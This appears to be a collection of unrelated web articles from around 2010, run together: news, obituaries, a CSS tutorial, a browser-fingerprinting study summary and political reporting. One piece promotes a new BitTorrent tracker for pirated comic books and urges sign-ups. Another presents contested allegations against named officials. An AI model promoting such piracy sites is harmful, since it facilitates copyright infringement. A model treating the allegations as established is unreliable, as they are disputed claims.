And I ’ll have more to say about Greylock as I move into my new role there .
Venture investing is what I ’ve wanted to do for quite a long time —
I ’ve been involved in many startups , even building an incubator a decade ago , and have interests that span enterprise , open source , and the broader web , among others .
I ’m incredibly excited to join an amazing team there — it ’s a firm that I ’ve noted to be incredibly strongly oriented towards entrepreneurs — it really matches my sensibilities as an operator extremely well .
Will be blogging and tweeting ( @johnolilly ) as per normal — more soon .
Below is the letter I sent to everyone here at Mozilla , who I am deeply indebted to and proud of .
Everyone ,
As my five year anniversary at Mozilla approaches , I ’ve decided that it ’s time for me to move on to my next role sometime later this year .
This wo n’t happen today or tomorrow — I expect to be here and working for several months yet , and I ’m planning to stay on the Board of Directors .
This is a tough note for me to write —
I feel so incredibly lucky and humbled to have worked on such an amazing project , with such spectacular people , for the last few years .
But I ’ve always been a startup guy at heart — Mozilla was originally going to be a quick volunteer effort for me , but quickly turned into a full time job , and at the beginning of 2008 turned into the CEO job that I have now .
I ’ve really been missing working with startups , and want to learn how to invest in and build great new startups , so am planning to join Greylock Partners as a Venture Partner once we transition here .
I ’m in no rush , and the most important thing to me is to build the strongest Mozilla we can , with the best leadership possible .
So my plan is to stay through that transition — we ’re starting a CEO search now , and plan to do it in as transparent a way as possible — which means I ’ll continue in my CEO role as normal for several more months , at least .
I ’ll have more to say on the transition as we figure things out more clearly , but for now , business as usual .
We ’ve got Firefox 4 to ship , and Firefox on multiple mobile platforms .
We ’ve got our web services like Weave to stand up and make available to millions of users .
For now , though , I really want to communicate a deep gratitude to each of you — over the past few years we ’ve done an amazing amount together , and changed the world in so many meaningful ways .
400 million users are directly touched every day by the work we ’ve done so far , and many , many more are using better browsers because of our work .
There are many more contributions and victories to come .

Louise Bourgeois , the French - born American artist who gained fame only late in a long career , when her psychologically charged abstract sculptures , drawings and prints had a galvanizing effect on younger artists , particularly women , died on Monday at the Beth Israel Medical Center in Manhattan .
She was 98 .
The death was reported by Wendy Williams , the managing director of the Louise Bourgeois Studio .
Ms. Bourgeois ’s sculptures in wood , steel , stone and cast rubber , often organic in form and sexually explicit , emotionally aggressive yet witty , covered many stylistic bases .
But from first to last they shared a set of repeated themes , centered on the human body and its need for nurture and protection in a frightening world .
Among her most familiar sculptures was the much exhibited “ Nature Study ” ( 1984 ) , a headless sphinx with powerful claws and multiple breasts .

With over 50,000 applications in the Android Market , and that number increasing very rapidly , finding a legitimate and detailed review of an application is difficult .
If you ’ve tried using the official Android Market website , you ’ve probably noticed that the experience is …well , less than ideal .
Enter app review websites .
Many app review sites are supported by an open - source API ( Application Programming Interface ) that allows these sites to provide information that is congruent with the Android Market to its visitors .
Some app review sites go so far as to allow visitors to contribute their own two cents to each application 's individual review , such as user ratings and user generated comments .
App review sites also provide screen shots , videos , and descriptions .
What Criteria Makes for a Great Application Review Site ?
Each app review site is different , but there are some general criteria we as users can expect to see from a great one .
When looking for a credible app review site we need to consider the following criteria :
Quality Content
Content is key when deciding if an app review is legitimate .
Good content can make or break the decision to download , or even pay for an application .
A great app review site will have more than just the basic description .
If we take a look at the Android Market 's website you 'll notice that there are n't very many applications listed , and the apps that you do see have hardly what would be considered a quality description .
For example , the Qik application on the Android Market 's website has a total of 3 sentences explaining what the application does , whereas on an app review site like AndroidTapp.com , their review of Qik does much more .
Their website provides you with a description of the app , pros & cons , a description of features , and AndroidTapp even provides a video showing how the application works .
In comparison , we find that an app review site does a significantly better job presenting content defining the application than the Android Market website .
Screen Shots / Videos
The Android Market via our handsets provides us with screen shots of nearly every application , however sometimes it 's helpful to have a bit more , such as a video .
Application review sites like AndroidApps.com provide us with not only great content , but also video reviews of how the application functions - showing us key features , and how the application works overall .
This can be handy for those applications that we have to pay for , but we 're not sure if the value of the app is worth the cost .
Video reviews give us the " try before you buy " mentality - without actually having to pay for anything right away .
Price Listing
Money is a big deal , especially in times like these .
When paid applications can range anywhere from $.99 to $ 20 or more , its definitely a wise idea to read reviews before you buy to see what people are saying about their experiences .
A great review can draw excitement to a specific application , but when the reader gets excited and finds out that the writer failed to mention cost , going to the Android Market can leave one feeling empty and hesitant to purchase .
Several app review sites make sure to post whether or not an app is free , a few worth mentioning are AppBrain.com and Androlib.com - they actually allow visitors to browse apps via a free category or a paid category - to make life easier .
On the topic of price , AppBrain also helps you find which apps have had a drop in price , making it easier to save a buck or two .
User Ratings
User ratings are the most important criteria to take note of when looking through an app review or even before downloading or purchasing any application .
User ratings score an application on a scale of 1 to 5 stars : 1 being the worst , and 5 being the best .
Applications with ratings of 4 or 5 stars are usually great applications with a solid following .
An app review site that allows users to contribute their rating is definitely a must .
Why download an app that has a poor rating ?
A low user rating can indicate issues that have not yet been resolved by the developer - and it may be best to wait on downloading or purchasing .
It ’s also great to contribute and rate app ’s that you enjoy or may have had issues with .
Besides emailing the developer , user ratings are a great way for developers of an application to discover user related issues , and improve their creation .
QR / Scan Codes
A QR Code is short for a " Quick Response " code .
It is a two - dimensional bar code that applications such as Barcode Scanner and ShopSavvy can capture and direct a user to the Android Market for easy download .
These codes are usually available with every application 's review on a great app review site .
Usually the more " database - like " app review sites provide these code for their users .
Now that we have a set of criteria to work from , lets take a look at how the top Android App review sites stack up ...

Fiona Adams pictured on social networking site bebo A 17 - year - old boy has been arrested after two young children were killed in a " suspicious " house fire in a Derbyshire town .
Fire crews were called to the terraced house in Edale Way , Buxton , shortly after 2345 BST on Friday .
A woman , 23 , and her baby son escaped from a first floor window , but a girl , five , and a boy , two , died .
The eight - month - old baby and mother , named locally as Fiona Adams , are in hospital with severe burns .
The mother is currently in a specialist burns unit at Wythenshawe Hospital in Manchester .
A hospital spokesperson said her condition was " comfortable and stable " .
It is thought she jumped with the baby from a rear window on to a trampoline in the garden .
' Robust investigation '
The baby has since been transferred to Royal Manchester Children 's Hospital .
Derbyshire Fire and Rescue Service and Derbyshire Police are conducting a joint investigation into the fire , which is being treated as suspicious .
Police said the teenager was arrested in the early hours of Saturday .
It 's heartbreaking , I 'm still in shock now
Neighbour Karen Jackson Assistant Chief Constable Steve Cotterill said : " We do not know the cause of the fire yet but at this stage we are treating it as suspicious as , on the face of it , there is no apparent obvious accidental cause .
" This is to ensure a thorough and robust investigation into how it started .
" We are still at the early stages of the investigation but we have a number of lines of inquiry to follow and are keeping an open mind as to what has happened and who , if anyone , was responsible .
" We have only recently been able to gain access to the property for safety reasons and a full crime scene investigation is under way . "
Previous disturbance Police had previously been called to the house at 2245 BST on Friday after reports of noise and nuisance in the back garden , Mr Cotterill said .
Officers attended and found garden furniture had been disturbed but nothing else was found .

Advertisement Mr Cotterill said because police had contact with the family prior to the fire breaking out the incident had been referred to the Independent Police Complaints Commission .
He said : " We are looking [ into ] whether there is any possible connection with this first call and the fire around an hour later .
" We can further confirm that police have previously been called to the premises over the last three years mainly in relation to domestic - related matters and on a couple of occasions in relation to reports of anti-social behaviour [ and ] damage . "
Roof destroyed Neighbour Karen Jackson said she had been at the scene in the early hours of Saturday .
She said : " They were brilliant , a lovely family .
Everyone liked them , everyone .
They did n't have any enemies .
" It 's heartbreaking , I 'm still in shock now .
I just feel numb . "
Floral tributes and teddy bears have been left at the scene .
One read : " Sleep with the angels little darlings .
God bless . "
The end - of - terrace house has been cordoned off while investigations are carried out .
The fire burned through the roof and the upstairs windows and front door were destroyed .
Crews from north Derbyshire and Staffordshire attended the call .
Police have appealed for anyone with information about the fire to contact officers .

If you follow the science ( and probably Sci - Fi ) news at all , you ’ve probably heard about Craig Venter ’s successful creation of the first synthetic organism .
Just so we ’re all on the same page , the new organism is much like any other bacterium , except it has a custom - made genome with not only genes , but also encoded signatures , choice James Joyce quotes , and a secret web address !
I ’ll leave you to discover more details on your own if you like ( here ’s the publication in Science and the full genome ) , but that essentially sums it up .
The next question you should ask is … so what ?
If you were to ask this question of a scientist in the field of genetics or microbiology , they would have a hard time answering the question .
Since we ’re all geeks here , let me give you a computer analogy .
Think of explaining the importance of an integrated circuit to someone who had never seen a computer before .
On one level you might be able to explain the value of miniaturization or even personal computers , but something way down the line , such as the internet , would be very hard to get across .
This discovery is much the same … the implications are so huge that it ’s hard for even working experts to envision all the possibilities .
That being said , there is a better way to “ think with ” Venter ’s work .
Instead of trying to imagine all of the potential products , think of synthetic organisms as a method .
What Venter ’s team has done is opened up a whole new world of potential experiments for other scientists .
Before now , if you wanted a large number of genes added or removed from a bacteria , you would either have to introduce a big chunk of foreign DNA to the cell called a plasmid ( which would be fairly unstable ) or work very hard to mutate the organism ’s genome directly .
Both of these processes might accomplish what you need done , but the synthetic genome method could save you a lot of headaches .
It took years of work and $ 40 million to create the first synthetic genome , but if Craig Venter ’s previous exploits ( inventing technologies to help finish the Human Genome Project two years ahead of schedule ) , we can expect to see a supporting industrial complex reasonably soon .
* Blue colonies ( top ) and electron micrograph of a cluster of cells ( bottom ) from JCVI and UCSD , repectively , via Science .
Another thing to think about is the organism itself .
Mycoplasma itself is a very small organism with a very small genome .
The researchers chose it as the model for this experiment because it is one of the simplest free - living organisms .
Again , we can think of this organism ’s miraculous manipulation as a method .
Given a little time , other , more relevant organisms ( E. coli , B. subtilis , and various pathogens of interest ) will probably have their own adapted versions of this system .
Instead of spending weeks generating complex knock - outs ( the term for organisms who have had gene ( s ) removed ) , a researcher might be able to send away for a fully customized strain with lots of helpful genetic tools and markers already built into its genome .
One last point that a number of observers have brought up is the potential danger of this technology .
While potential bioweapons live and grow all around us ( Anthrax and Tularemia ’s causative agents are native to the entire Northern hemisphere ) , the idea of custom - made viruses and microbes still inspires a new degree of fear .
Once these techniques reach a level of automation that requires only a working knowledge of genomics , “ designer bugs ” will definitely be in the reach of well - funded corporations and rogue nations alike .
We are entering into a new generation of ubiquitous biotechnologies that will need to be regulated and generally kept under a close eye .
As with any technology , it is not evil unto itself , but there is always a potential for wrong - doing to occur .
I ’d love to field some questions about the new technology if you have them .
Do n’t be afraid to ask … I ’ll try to answer as many as I can for at least a few months after this article goes to print .
Just share your thoughts in the comments below or bug me on Twitter !
Once upon a time , many years ago , 33rd Ward alderman Richard Mell liked me .
At one point in the early 1980s he actually drove me around his ward , showing me the parks and schools and explaining how things worked in this town .
It was like he was my favorite uncle .
Back then I was a rookie writer stringing a story for a local paper .
Maybe he figured I could n't do him much harm .
But somewhere along the way his attitude changed .
Maybe it had something to do with all the articles I wrote about his powerful ward organization — filled with city , county , and state patronage workers — beating up on the hapless opposition .
By the 1990s he was no longer returning my calls , and that 's pretty much the way things have been ever since .
So imagine my surprise when out of the blue one of Mell 's legislative aides called to invite me to speak at the April meeting of the 33rd Ward zoning advisory committee .
My topic ?
What else : tax increment financing .
I could n't get there fast enough .
With this coming on the heels of an invitation by Monique Bond , spokeswoman for the Chicago Public Schools , to come downtown for my own private briefing ( where she and other top CPS officials patiently explained to me why pay increases are n't " raises " ) it was like I 'd suddenly become the most popular man in town .
It would n't have surprised me to get a call from City Hall letting me know the mayor wanted his own private TIF tutorial .
Hey , based on what he 's said publicly about the program , he could use one .
Anyway , my meeting with the Mell gang took place in the basement of the Horner Park field house , at California and Montrose .
About 50 people showed up .
From the questions they asked , it was clear they got the gist of how the program works — and shared my views about it .
I sat at a table at the front of the room between Alderman Mell and his daughter , state rep Deb Mell , who also never returns my calls .
I called the TIF program wasteful and inefficient , because it is .
And I said it was designed to develop poor , blighted communities but mostly succeeds in sending money to the richer parts of town , because it does .
I pulled out the tax bill of a property owner who lives in a TIF district to show how money diverted into TIF funds is not itemized on ordinary tax bills , which tricks people into thinking it costs them nothing — though in fact it sucks up about half a billion dollars a year in property taxes that would otherwise go to the schools , parks , county , and other local agencies and causes those bodies to raise their levies .
In essence it 's an extra $ 500 million - a - year tax on local property owners .
I talked about the errors , half - truths , and evasions that riddle the city 's official statements on the program , most notably " The ABC's of TIF " on the Department of Community Development 's website .
Every so often Alderman Mell rolled his eyes or shook his head or even interjected to say the program was n't so bad .
But he stopped defending the program after I pulled out a fact sheet I 'd put together with my colleague Mick Dumke showing that the Second Ward , led by rookie Alderman Robert Fioretti , was the city leader in reaping TIF money while the 33rd Ward , led by the loyal 35 - year veteran , was in the bottom half , a difference of tens of millions of dollars a year .
While I talked , Mell scoured the numbers with the intensity of a bookie reading a tip sheet .
Someone in the audience asked me to get a little more specific about what should be done about the TIF program , so I suggested we start with Representative Mell .
The program is governed by state law , which means the General Assembly could reform it if legislators wanted to .
Representative Mell said she wanted to do something about it , and asked me what I 'd suggest .
Wow — next thing you know they 'll be asking me for advice on election - law reform .
So I threw out two ideas .
One , tighten up regulations so only truly blighted communities — like Englewood or Lawndale — get to create TIF districts .
That way wealthier areas like the central business district do n't siphon off tax money .
And two , limit the amount that each TIF district collects .
It 's one thing for the City Council to approve a TIF district to fund a specific project — say , a new shopping mall that wo n't be built without a $ 1 million subsidy .
But it 's another to let that district collect millions of taxpayer dollars on top of its original purpose .
All that extra property tax money ends up as a slush fund Mayor Daley can pretty much manipulate however he likes .
So if you really want to crack down on TIF abuses , pass a law that slaps a cap on the program , limiting each TIF district to the amount it will cost to fund the project or projects it was designed for .
Voila — problem solved .
Let 's break for dinner .
Of course , such legislation would invite the wrath of Mayor Daley , not to mention countless suburban mayors and officials with their own little TIF empires .
Good luck getting that one out of committee , much less into the law books .
But , I added , I suppose if anyone could lead the charge it would be Representative Mell , who , thanks to her father 's clout , is largely impervious to the counterattacks of the mayor .
She smiled when I said that .
At one point I got so worked up in my oration that Aldermen Mell said I sounded like a candidate and suggested I run for office .
I told him that I 'd never make the ballot once he and his election - law lawyers got through challenging my nominating petitions .
Got a chuckle out of the old man with that one .
After a while Alderman Mell started talking about how he actually agreed with a lot of the things I was saying .
He said he saw no reason the TIF take should n't be listed on property tax bills so folks know exactly how their money is being spent .
He went on to say he might even introduce a resolution to the City Council calling on his colleagues to look into the matter .
Masterful move , I must say .
Frustration with TIF abuses is ( very ) slowly spreading among north - side voters .
In the Democratic primaries in February , I heard a few legislative candidates vow to clean up the program — something I 've never heard in more than a decade of reporting on TIFs .
And earlier this year a few north - side state legislators , including Harry Osterman and John Fritchey , actually voted against extending the life of a couple of TIF districts .
So it 's not a bad idea for a north - side alderman up for election in 2011 to act like he cares .
Even an entrenched incumbent like Richard Mell .
At the very least , an old pro like the alderman — who 's engineered the election of a bunch of local pols , including his daughter Deb , former 35th Ward alderman Vilma Colom , and his son - in - law , former governor Rod Blagojevich — knows enough to give a room filled with voters a little bit of what they want to hear .
I guess you could say he was using me as much as I was using the forum — he'd dragged me out to make it look like he was on board with TIF reform just in case that train ever leaves the station .
Got to give the man credit : he 's always one step ahead in this game .
And a few days after the forum , Representative Mell called to say she'd be talking over TIF reform legislation with Osterman .
I 'll keep you posted .
When the meeting was over , Alderman Mell announced that a spokesman from the city 's Department of Community Development would be coming out to the May meeting to provide the " other side " of the TIF story .
Someone in the audience urged me to come back and debate the city 's guy .
" Oh , no , " said Alderman Mell .
" He got his bite of the apple . "
I reminded him that he had invited me to this little get - together , so he was the one who'd bitten the apple .
Or something like that .
Before I left , one of Alderman Mell 's aides asked the two of us to pose for a photo for the alderman 's Web site .
The alderman looked like he'd rather drink sour milk .
But I put my arm around him and said , " C'mon , alderman , you know you love me . "
He rolled his eyes again but then clasped my hand and gave me what I 'd hoped for : a big ol ' smile .
A few days later Mell posted the grip - and - grin shot with the tag line : " Ben Joravsky and Alderman Mell agree to remain political frenemies . "
Guess that about sums it up .
Ben Joravsky discusses his reporting weekly with journalist Dave Glowacz at mrradio.org / theworks .

More than two dozen cases of locally - acquired dengue fever have hit the resort town of Key West , Fla. , in the past nine months , officials from the U.S Centers for Disease Control and Prevention said .
Although not the first cases of home - grown dengue in the U.S. , or even in Florida , the outbreak highlights the need for physician vigilance regarding this and other formerly exotic tropical diseases , the CDC said in the May 21 issue of Morbidity and Mortality Weekly Report .
" The re-emergence of dengue in Florida as well as the threat posed to the U.S. from other emerging mosquito - borne arboviruses ( e.g. , chikungunya ) emphasizes the necessity for strong vector - borne surveillance and mosquito control infrastructure to rapidly identify and control outbreaks of dengue or other mosquito - borne diseases , " MMWR 's editors wrote in a commentary accompanying the report .
Dengue fever is a viral infection transmitted by mosquito bites .
It can be debilitating , but is not usually fatal in otherwise healthy people .
It is endemic in the Western Hemisphere from Mexico southward .
Most cases seen by U.S. physicians have involved travelers to such regions .
Over the past 30 years , a few cases of locally - acquired dengue have been confirmed along the Texas - Mexico border , according to the report , authored by CDC researchers , public health officials in Florida , and physicians who treated the first cases in the new Key West outbreak .
Dengue was also known in Florida in the 1930s , but no locally - acquired cases had been confirmed since then , until last August .
The first case was actually identified in Rochester , N.Y. , involving a 34 - year - old woman who had just returned from a week - long visit to Key West .
The day after arriving back in Rochester , she went to her doctor complaining of fever , headache , malaise , and chills .
Lab analysis showed bacteria and blood in her urine .
Not surprisingly , her primary care physician and a local emergency department did not initially suspect dengue .
The presumptive diagnosis was a urinary tract infection and she was treated accordingly .
Some of her symptoms resolved , but a week later she returned to her primary care doctor saying she did n't " feel right , " the MMWR report said .
An infectious disease specialist was called in , who inquired about travel to dengue - endemic areas .
She denied having been out of the country , but said she had received multiple mosquito bites during her Key West visit , and she was tested for dengue antibodies , which came back positive .
Public health officials in the county where Key West is located were informed , and they notified local physicians and the public of the potential for locally acquired dengue .
As a result , several other recent cases of febrile illness with other symptoms such as headache , myalgia , chills , and vomiting , were discovered to be dengue .
In response , according to the MMWR report , officials in the Keys stepped up mosquito control efforts , going door - to - door to find and eradicate breeding sites .
They also encouraged the public to take steps to prevent mosquito bites .
Officials conducted random serological testing in local households , finding that about 5 percent of 240 individuals carried dengue antibodies .
Key West physicians were also contacted to provide serum specimens from recent patients with symptoms consistent with dengue .
Nine of 21 samples sent for testing came back positive for dengue .
The tally of confirmed dengue infections in Key West eventually grew to 28 , with the most recent case diagnosed in mid-April .
Dengue is much more of a problem elsewhere in the hemisphere , with an estimated 4.6 million cases from 2000 to 2007 in Mexico , the Caribbean , and Central and South America , according to MMWR 's editors .
But the Key West outbreak demonstrates the potential for significant penetration into the continental U.S. , they suggested .
They noted that international travelers can pick up the virus in endemic areas , and are often still viremic when they return .
In areas with mosquito species capable of transmitting the virus -- such as Aedes aegypti and Aedes albopictus , both present in the southern and southeastern U.S. -- dengue can then spread locally .
The editors also recommended that physicians consider dengue when evaluating any patient with a febrile illness who has recently been in subtropical areas of the U.S. , as well as in countries to the south .
" This is particularly important when signs and symptoms such as thrombocytopenia , leukopenia , hemoconcentration , rash , or eye pain are present , " they wrote .
Suspected cases should also be reported promptly to public health authorities , they indicated .
No external funding for the work was reported .
No potential conflicts of interest were reported .
You 're concerned about your online privacy , and you do all the right things to keep from being tracked around the Web : purge your cookies regularly , clean out Flash " supercookies , " even switch to browsers like Browzar , which lets you " search and surf the web without leaving traces on your computer . "
Does n't matter — your browser is giving you away .
Browsers can offer a window into a computer .
The browser 's " user - agent string " is visible to websites , for instance .
So are " HTTP ACCEPT " headers .
And it 's simple to infer whether cookies are being blocked .
In browsers with Javascript running , it 's easy for websites to discover screen resolution , a list of all browser plugins , and the user 's timezone .
Throw in Flash , and it 's possible to grab a complete list of system fonts .
Taken together , these bits of data produce a unique " fingerprint " that works even in the absence of cookies or other traditional Web tracking tools .
The Electronic Frontier Foundation , concerned about the issue , has just wrapped up its own study ( PDF ) on browser fingerprinting , and it finds that even the privacy conscious have made themselves simple to track .
Of the 470,161 browsers that participated in EFF's Panopticlick project , 83.6 percent had an " instantaneously unique fingerprint . "
Browsers with Flash or Java installed could be uniquely identified 94.2 percent of the time .
When one considers that " privacy conscious users " were over - represented in Panopticlick , these are surprising numbers .
Even the attempt to go stealthy could paradoxically make one more unique , and thus easier to track .
According to the EFF paper , " many kinds of measures designed to make a device harder to fingerprint are themselves distinctive unless a lot of other people also take them . "
Thus , the seven Browzar users in the survey pools were all easy to pick out .
For systems that rely on tracking cookies , fingerprints can be used to bake new cookies for users who have deleted theirs , making cookie tracking that much harder to eliminate .
And the EFF found that making tweaks to one 's browser in the hope of altering a fingerprint was largely futile — algorithms could correctly decipher most fingerprint changes over time .
Does anyone really use " browser fingerprints " to track online surfers ?
Probably , but it 's hard to know .
Such tracking leaves no traces on the user machine ( as a cookie would ) , and the companies that traffic in such practices are n't known for trumpeting them loudly .
Back in February , though , we did speak to one firm that already uses JavaScript to gather biometric markers like typing cadence during password entry — input the same password in a different typing rhythm and the system can detect another user .
According to EFF , " There are several companies that sell products which purport to fingerprint web browsers in some manner , and there are anecdotal reports that these prints are being used both for analytics and second - layer authentication purposes .
But , aside from limited results from one recent experiment , there is to our knowledge no information in the public domain to quantify how much of a privacy problem fingerprinting may pose . "
A few things helped maintain anonymity : blocking JavaScript , using add - ons like TorButton , and browsing on " certain types of smartphone . "
As for the policy implications , EFF argues that " policymakers should start treating fingerprintable records as potentially personally identifiable , and set limits on the durations for which they can be associated with identities and sensitive logs like clickstreams and search terms . "
We have lots of good news lined up in the BitTorrent front and here ’s the first of those stories .
As we have previously highlighted , the BT community has a serious lack of specialized trackers when it comes to comic books .
Leading comics trackers such as ZCultFM , CTT , AnimaTooniC , etc have shut down and comics fans nowadays do n’t have many options apart from H33T , Demonoid , Bibliotik & ComicPirates ( Of course , there are plenty of DDL forums for this purpose but we ’re talking about BitTorrent sites here ) .
Anyways the good news is that we ’ve seen the birth of a brand new comics tracker ; ComicBT .
For those interested , this site is currently open for registrations and new signups are now being accepted .
ComicBT is a very young site in the BitTorrent scene .
There are n’t many folks who even know of its existence yet .
This is not because CBT is a super secret , l33t tracker but because it ’s not a crazily hyped up site ( and it has received zero publicity so far ) .
CBT currently has only 30 registered users and 42 indexed torrents but we believe small , niche trackers such as this should be promoted despite their size or popularity - there is great potential for growth here .
First thing you ’ll notice after logging into CBT will be the site ’s theme .
The default theme which has a lot of green color has a very comic - book like feel to it ( the site still seems to be in final stages of development so there may be bugs present ) .
They have an impressive list of categories including categories sorted by major comic book publishers and if they can fill out those ‘ Packs ’ sections it would add real value to this site .
ComicBT has a bonus system in place and comes with all other standard features TBDEV 2009 source has to offer .
Note that there are wait times for this tracker .
However this should not affect you maintaining a good ratio as all torrents on site are free leech till 27th of May .
Signups for ComicBT are currently open .
While it ’s too early to predict the future of this tracker , signup may be worth it if you are a serious comic book fan .

I am updating it now to fix some inaccuracies in how this concept was presented .
I ’ve never specifically covered this subject before .
( rimshot ! )
The best way to explain it is to start with an example of where specificity gets confusing and perhaps does n’t behave like you would expect .
Then we ’ll take a closer look at how to calculate the actual specificity value to determine which selector takes precedence .
Here is a simple unordered list :
< ul id =" summer - drinks " > < li>Whiskey and Ginger Ale </ li > < li> Wheat Beer </ li > < li>Mint Julip</li > </ul >
Now you want to designate one of these your favorite drink and change its styling a bit .
You need a hook for this so you apply it via a class name on the list element .
< ul id =" summer - drinks " > < li class= " favorite " >
Whiskey and Ginger Ale </ li > < li> Wheat Beer </ li > < li>Mint Julip</li > </ul >
Now you pop open your CSS and do your styling for your new class :
. favorite { color : red ; font - weight : bold ; }
Then you take a look at your work , but alas , it did n’t work !
The text of your favorite drink did n’t turn red or go bold !
Something fishy is at work here .
Poking around more in the CSS , you find this :
ul #summer - drinks li { font - weight : normal ; font - size : 12 px ; color : black ; }
There is your trouble right there .
Two different CSS selectors are telling that text what color and font - weight to be .
There is only one statement for font - size , so clearly that one will take effect .
These are n’t “ conflicts ” per-say , but the browser does need to decide which one of these statements to honor .
It does so by following a standard set of specificity rules .
I think this confuses some beginners because they have n’t quite gotten this sorted out yet .
They might think because the . favorite statement is “ further down in the CSS ” or because the class = ” favorite ” is “ closer to the actual text ” in the HTML that will be the one that “ wins ” .
In fact , the order of selectors in your CSS does play a role and the “ further down ” one does in fact win when the specificity values are exactly the same .
For example :
. favorite { color : red ; } . favorite { color : black ; }
The color will be black … but I digress .
The point here is you want to be as specific as it makes sense to be every chance you get .
Even with the simple example presented above , it will become obvious to you eventually that simply using a class name to target that “ favorite drink ” is n’t going to cut it , or wo n’t be very safe even if it did work .
It would have been smart to use this :
ul #summer - drinks li.favorite { color : red ; font - weight : bold ; }
That is what I ’m calling “ being as specific as it makes sense to be ” .
You could actually be way more specific and use something like this :
html body div#pagewrap ul # summer - drinks li.favorite { color : red ; font - weight : bold ; }
But that is over the top .
It makes your CSS harder to read and yields no real benefits .
Another way to juice up the specificity value for your “ . favorite ” class is to use the ! important declaration .
. favorite { color : red ! important ; font - weight : bold ! important ; }
I once heard it said that ! important is like the Jedi mind trick for CSS .
Indeed it is , and you can force your will over the styling of elements by using it .
But ! important imposes that will through drastically increasing the specificity of that particular selectors property .
The ! important declaration can be easily misused if misunderstood .
It is best used to keep your CSS cleaner , in examples where you know elements with a particular class selector should use a certain set of styling no matter what .
Conversely , not used just as a quick crutch to override the styling of something instead of figuring out how the CSS was structured and working by the original author .
One of my classic examples is :
. last { margin - right : 0 !important ; }
I often use that in situations where there are multiple floated blocks , for the last block on the right in a row .
That ensures the last block does n’t have any right margin which would prevent it from butting snugly against the right edge of its parent .
Each of those blocks probably has more specific CSS selectors that apply the right margin to begin with , but ! important will break through that and take care of it with one simple / clean class .
Calculating CSS Specificity Value
Why is that our first attempt at changing the color and font - weight failed ?
As we learned , it was because simply using the class name by itself had a lower specificity value and was trumped by the other selector which targeted the unordered list with the ID value .
The important words in that sentence were class and ID .
CSS applies vastly different specificity weights to classes and IDs .
In fact , an ID has infinitely more specificity value !
That is , no amount of classes alone can outweigh an ID .
Let ’s take a look at how the numbers are actually calculated :
In otherwords :
If the element has inline styling , that automatically 1 wins ( 1,0,0,0 points )
wins ( 1,0,0,0 points )
For each ID value , apply 0,1,0,0 points
For each class value ( or pseudo - class or attribute selector ) , apply 0,0,1,0 points
For each element reference , apply 0,0,0,1 point
You can generally read the values as if they were just a number , like 1,0,0,0 is “ 1000 ” , and so clearly wins over a specificity of 0,1,0,0 or “ 100 ” .
The commas are there to remind us that this is n’t really a “ base 10 ” system , in that you could technically have a specificity value of like 0,1,13,4 – and that “ 13 ” does n’t spill over like a base 10 system would .
Sample calculations
Update : The : not ( ) sort - of - pseudo - class adds no specificity by itself , only what ’s inside the parens is added to specificity value .
Important Notes
The universal selector ( * ) has no specificity value ( 0,0,0,0 )
Pseudo - elements ( e.g. : first - line ) get 0,0,0,1 unlike their psuedo - class brethren which get 0,0,
1,0
The pseudo - class : not ( ) adds no specificity by itself , only what ’s inside it ’s parentheses .
The ! important value appended a CSS property value is an automatic win .
It overrides even inline styles from the markup .
The only way an ! important value can be overridden is with another ! important rule declared later in the CSS and with equal or great specificity value otherwise .
You could think of it as adding 1,0,0,0,0 to the specificity value .

Key October Surprise Evidence Hidden A Russian government report , which corroborated allegations that Ronald Reagan ’s presidential campaign interfered with President Jimmy Carter ’s Iran - hostage negotiations in 1980 , was apparently kept from the Democratic chairman of a congressional task force that investigated the charges a dozen years later .
Email
Printer friendly Lee Hamilton , then a congressman from Indiana in charge of the task force , told me in a recent interview , “ I do n’t recall seeing it , ” although he was the one who had requested Moscow ’s cooperation in the first place and the extraordinary Russian report was addressed to him .
The Russian report , which was dropped off at the U.S. Embassy in Moscow on Jan. 11 , 1993 , contradicted the task force ’s findings – which were released two days later – of “ no credible evidence ” showing that Republicans contacted Iranian intermediaries behind President Carter ’s back regarding 52 American hostages held by Iran ’s Islamic revolutionary government , the so - called October Surprise case .
I was surprised by Hamilton ’s unfamiliarity with the Russian report , so I e-mailed him a PDF copy .
I then contacted the task force ’s former chief counsel , attorney Lawrence Barcella , who acknowledged in an e-mail that he does n’t “ recall whether I showed [ Hamilton ] the Russian report or not . ”
In other words , the Russian report – possibly representing Moscow ’s first post - Cold War collaboration with the United States on an intelligence mystery – was not only kept from the American public but apparently from the chairman of the task force responsible for the investigation .
The revelation further suggests that the congressional investigation was shoddy and incomplete , thus reopening the question of whether Reagan ’s landslide victory in 1980 was , in part , set in motion by a dirty trick that extended the 444 - day captivity of the hostages who were freed immediately after Reagan was sworn into office on Jan. 20 , 1981 .
The coincidence between Reagan ’s inauguration and the hostage release was curious to some but served mostly to establish in the minds of Americans that Reagan was a tough leader who instilled fear in U.S. adversaries .
However , if the timing actually resulted from a clandestine arms - for - hostage deal , it would mean that Reagan ’s presidency began with an act of deception , as well as an act of treachery .
The Russian report also implicates other prominent Republicans in the Iranian contacts , including the late William Casey ( who was Reagan ’s campaign director in 1980 ) , George H.W. Bush ( who was Reagan ’s vice presidential running mate ) , and Robert Gates ( who in 1980 had been a CIA officer on the National Security Council before becoming executive assistant to Carter ’s CIA Director Stansfield Turner ) .
Casey , who served as Reagan ’s first CIA director , died in 1987 before the 1980 allegations came under scrutiny .
Bush , who was President during the task force ’s 1992 inquiry , angrily denied the accusations at two news conferences but was never questioned under oath .
Gates , who was CIA director in 1992 and is now President Barack Obama 's Defense Secretary , also has brushed off the suspicions .
Competing Offers
As described by the Russians , the 1980 hostage negotiations boiled down to a competition between the Carter administration and the Reagan campaign offering the Iranians different deals if the hostages were either released before the election to help Carter or held until after the election to benefit Reagan .
The Iranians “ discussed a possible step - by - step normalization of Iranian - American relations [ and ] the provision of support for President Carter in the election campaign via the release of American hostages , ” according to the U.S. Embassy ’s classified translation of the Russian report .
Meanwhile , the Republicans were making their own overtures , the Russian report said .
“ William Casey , in 1980 , met three times with representatives of the Iranian leadership , ” the report said .
“ The meetings took place in Madrid and Paris . ”
At the Paris meeting in October 1980 , “ R[obert ] Gates , at that time a staffer of the National Security Council in the administration of Jimmy Carter , and former CIA Director George Bush also took part , ” the Russian report said .
“ In Madrid and Paris , the representatives of Ronald Reagan and the Iranian leadership discussed the question of possibly delaying the release of 52 hostages from the staff of the U.S. Embassy in Teheran . ”
